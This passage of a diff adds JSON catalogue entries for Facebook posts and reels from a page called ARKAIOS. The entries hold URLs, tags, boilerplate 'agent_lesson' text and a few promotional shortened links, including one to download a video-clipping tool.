+    "original_url": "https://www.facebook.com/photo.php?fbid=122171146844989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122171146844989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122171146844989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Avenus... Repro,,, \nAdios Spotify\nHola Arkaios-Potify\nhttps://arkaios.qzz.io/ySySoNO",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Avenus... Repro,,, \nAdios Spotify\nHola Arkaios-Potify\nhttps://arkaios.qzz.io/ySySoNO...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122171146844989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122171023238989266",
+    "title": "ARKAIOS Reel #834606902704910",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/834606902704910/",
+    "canonical_url": "https://www.facebook.com/reel/834606902704910/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/834606902704910/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/834606902704910/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/834606902704910/"
+  },
+  {
+    "id": "meta-776644758860856_122171012474989266",
+    "title": "https://www.facebook.com/share/r/19Js8x3bPd/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1469481465204943/",
+    "canonical_url": "https://www.facebook.com/reel/1469481465204943/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1469481465204943/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/19Js8x3bPd/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1469481465204943/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1469481465204943/"
+  },
+  {
+    "id": "meta-776644758860856_122171012294989266",
+    "title": "https://www.facebook.com/share/r/1A5MEVedds/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/27603735132662973/",
+    "canonical_url": "https://www.facebook.com/reel/27603735132662973/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/27603735132662973/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/1A5MEVedds/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/27603735132662973/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/27603735132662973/"
+  },
+  {
+    "id": "meta-776644758860856_122170942706989266",
+    "title": "ARKAIOS Reel #894051800419219",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/894051800419219/",
+    "canonical_url": "https://www.facebook.com/reel/894051800419219/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/894051800419219/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/894051800419219/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/894051800419219/"
+  },
+  {
+    "id": "meta-776644758860856_122170942526989266",
+    "title": "ARKAIOS Reel #1992593778794922",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1992593778794922/",
+    "canonical_url": "https://www.facebook.com/reel/1992593778794922/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1992593778794922/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1992593778794922/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1992593778794922/"
+  },
+  {
+    "id": "meta-776644758860856_122170873598989266",
+    "title": "Porque nada está 100% oculto todo lo creado tiene una debilidad de ahí el ecosistema del error dañado así al 20% del 100",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2442370936169072/",
+    "canonical_url": "https://www.facebook.com/reel/2442370936169072/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2442370936169072/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Porque nada está 100% oculto todo lo creado tiene una debilidad de ahí el ecosistema del error dañado así al 20% del 100% de cualquier cosa o del todo en si.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2442370936169072/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2442370936169072/"
+  },
+  {
+    "id": "meta-776644758860856_122170813784989266",
+    "title": "ARKAIOS Reel #1056923023362945",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1056923023362945/",
+    "canonical_url": "https://www.facebook.com/reel/1056923023362945/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1056923023362945/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1056923023362945/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1056923023362945/"
+  },
+  {
+    "id": "meta-776644758860856_122170809296989266",
+    "title": "ARKAIOS Reel #1358334363013831",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1358334363013831/",
+    "canonical_url": "https://www.facebook.com/reel/1358334363013831/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1358334363013831/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1358334363013831/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1358334363013831/"
+  },
+  {
+    "id": "meta-776644758860856_122170808654989266",
+    "title": "ARKAIOS Reel #1504179767694263",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1504179767694263/",
+    "canonical_url": "https://www.facebook.com/reel/1504179767694263/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1504179767694263/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1504179767694263/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1504179767694263/"
+  },
+  {
+    "id": "meta-776644758860856_122170806074989266",
+    "title": "logoai.com",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2028612837781171/",
+    "canonical_url": "https://www.facebook.com/reel/2028612837781171/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2028612837781171/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "logoai.com",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2028612837781171/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2028612837781171/"
+  },
+  {
+    "id": "meta-776644758860856_122170793090989266",
+    "title": "ARKAIOS Reel #1101116052256355",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1101116052256355/",
+    "canonical_url": "https://www.facebook.com/reel/1101116052256355/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1101116052256355/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1101116052256355/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1101116052256355/"
+  },
+  {
+    "id": "meta-776644758860856_122170174106989266",
+    "title": "Con 𝐒𝐓𝐈𝐋𝐋 𝐆𝐀𝐌𝐄𝐒 𝐌𝐗 – ¡Me acaban de reconocer como uno de sus fans destacados! 🎉",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4527057164204306/",
+    "canonical_url": "https://www.facebook.com/reel/4527057164204306/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4527057164204306/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Con 𝐒𝐓𝐈𝐋𝐋 𝐆𝐀𝐌𝐄𝐒 𝐌𝐗 – ¡Me acaban de reconocer como uno de sus fans destacados! 🎉",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4527057164204306/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4527057164204306/"
+  },
+  {
+    "id": "meta-776644758860856_122170173686989266",
+    "title": "Sistema único en cortes de videos y mixes de YouTube!!!.",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122170173650989266&set=a.122094865592989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122170173650989266&set=a.122094865592989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122170173650989266&set=a.122094865592989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Sistema único en cortes de videos y mixes de YouTube!!!.\nhttps://arkaios.qzz.io/bbT2DWL\nDescarga el sistema ejecutable:\nhttps://arkaios.qzz.io/ujlFzqR",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Sistema único en cortes de videos y mixes de YouTube!!!.\nhttps://arkaios.qzz.io/bbT2DWL\nDescarga el sistema ejecutable:\nhttps://arkaios.qzz.io/ujlFzqR...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122170173650989266&set=a.122094865592989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122170160798989266",
+    "title": "Si te piden tu croquis no lo pienses más crealo aqui para tu escuela descarga aqui el pdf solo para imprimir y edita el",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122170160732989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122170160732989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122170160732989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Si te piden tu croquis no lo pienses más crealo aqui para tu escuela descarga aqui el pdf solo para imprimir y edita el resultado antes de crear tu .pdf solo pon los puntos necesarios de tu casa a tu escuela y listo...\nhttps://arkaios.qzz.io/Maa-KVJ",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Si te piden tu croquis no lo pienses más crealo aqui para tu escuela descarga aqui el pdf solo para imprimir y edita el resultado antes de crear tu .pdf solo pon los puntos necesarios de tu casa a tu escuela y listo...\nhttps://arkaios.qzz.io/Maa-KVJ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122170160732989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122170025852989266",
+    "title": "ARKAIOS Reel #2133918094219252",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2133918094219252/",
+    "canonical_url": "https://www.facebook.com/reel/2133918094219252/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2133918094219252/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2133918094219252/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2133918094219252/"
+  },
+  {
+    "id": "meta-776644758860856_122169779198989266",
+    "title": "https://www.facebook.com/share/p/18yHoPjPz7/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1072584098450273&set=a.194713529570672&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1072584098450273&set=a.194713529570672&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1072584098450273&set=a.194713529570672&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "https://www.facebook.com/share/p/18yHoPjPz7/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: https://www.facebook.com/share/p/18yHoPjPz7/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1072584098450273&set=a.194713529570672&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122169771980989266",
+    "title": "Verdades que duelen...",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/915650531585055/",
+    "canonical_url": "https://www.facebook.com/reel/915650531585055/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/915650531585055/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Verdades que duelen...",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/915650531585055/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/915650531585055/"
+  },
+  {
+    "id": "meta-776644758860856_122169721322989266",
+    "title": "Mas Info y documentación:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1089072983895869/",
+    "canonical_url": "https://www.facebook.com/reel/1089072983895869/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1089072983895869/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Mas Info y documentación:\nhttps://arkaios.qzz.io/wGjtEpU\nmas del desarrollador del video: Securiters",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1089072983895869/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1089072983895869/"
+  },
+  {
+    "id": "meta-776644758860856_122169625652989266",
+    "title": "ARKAIOS Reel #3559152944254807",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/3559152944254807/",
+    "canonical_url": "https://www.facebook.com/reel/3559152944254807/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/3559152944254807/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/3559152944254807/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/3559152944254807/"
+  },
+  {
+    "id": "meta-776644758860856_122169622724989266",
+    "title": "ARKAIOS Reel #1380780684014560",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1380780684014560/",
+    "canonical_url": "https://www.facebook.com/reel/1380780684014560/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1380780684014560/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1380780684014560/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1380780684014560/"
+  },
+  {
+    "id": "meta-776644758860856_122169595226989266",
+    "title": "https://www.facebook.com/share/r/1JLAto3zVg/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1395707432665886/",
+    "canonical_url": "https://www.facebook.com/reel/1395707432665886/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1395707432665886/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/1JLAto3zVg/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1395707432665886/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1395707432665886/"
+  },
+  {
+    "id": "meta-776644758860856_122169593936989266",
+    "title": "https://www.facebook.com/share/r/1BfHrqpTzi/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2278938122908717/",
+    "canonical_url": "https://www.facebook.com/reel/2278938122908717/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2278938122908717/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/1BfHrqpTzi/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2278938122908717/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2278938122908717/"
+  },
+  {
+    "id": "meta-776644758860856_122169570404989266",
+    "title": "ARKAIOS Reel #2139826549933290",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2139826549933290/",
+    "canonical_url": "https://www.facebook.com/reel/2139826549933290/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2139826549933290/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2139826549933290/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2139826549933290/"
+  },
+  {
+    "id": "meta-776644758860856_122169569840989266",
+    "title": "ARKAIOS Reel #1727474618397207",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1727474618397207/",
+    "canonical_url": "https://www.facebook.com/reel/1727474618397207/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1727474618397207/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1727474618397207/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1727474618397207/"
+  },
+  {
+    "id": "meta-776644758860856_122169569462989266",
+    "title": "ARKAIOS Reel #1027626409786357",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1027626409786357/",
+    "canonical_url": "https://www.facebook.com/reel/1027626409786357/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1027626409786357/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1027626409786357/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1027626409786357/"
+  },
+  {
+    "id": "meta-776644758860856_122169516458989266",
+    "title": "PC tip that can save you. Pt.126",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1663413571558481/",
+    "canonical_url": "https://www.facebook.com/reel/1663413571558481/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1663413571558481/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1663413571558481/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1663413571558481/"
+  },
+  {
+    "id": "meta-776644758860856_122169143588989266",
+    "title": "ARKAIOS Reel #1375292341233473",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1375292341233473/",
+    "canonical_url": "https://www.facebook.com/reel/1375292341233473/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1375292341233473/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1375292341233473/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1375292341233473/"
+  },
+  {
+    "id": "meta-776644758860856_122169127412989266",
+    "title": "ARKAIOS Reel #1985384155445860",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1985384155445860/",
+    "canonical_url": "https://www.facebook.com/reel/1985384155445860/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1985384155445860/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1985384155445860/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1985384155445860/"
+  },
+  {
+    "id": "meta-776644758860856_122169093122989266",
+    "title": "ARKAIOS Reel #2094616904452592",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2094616904452592/",
+    "canonical_url": "https://www.facebook.com/reel/2094616904452592/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2094616904452592/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2094616904452592/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2094616904452592/"
+  },
+  {
+    "id": "meta-776644758860856_122169092702989266",
+    "title": "ARKAIOS Reel #1398150902409945",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1398150902409945/",
+    "canonical_url": "https://www.facebook.com/reel/1398150902409945/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1398150902409945/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1398150902409945/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1398150902409945/"
+  },
+  {
+    "id": "meta-776644758860856_122168999996989266",
+    "title": "ARKAIOS Reel #1025112619854941",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1025112619854941/",
+    "canonical_url": "https://www.facebook.com/reel/1025112619854941/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1025112619854941/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
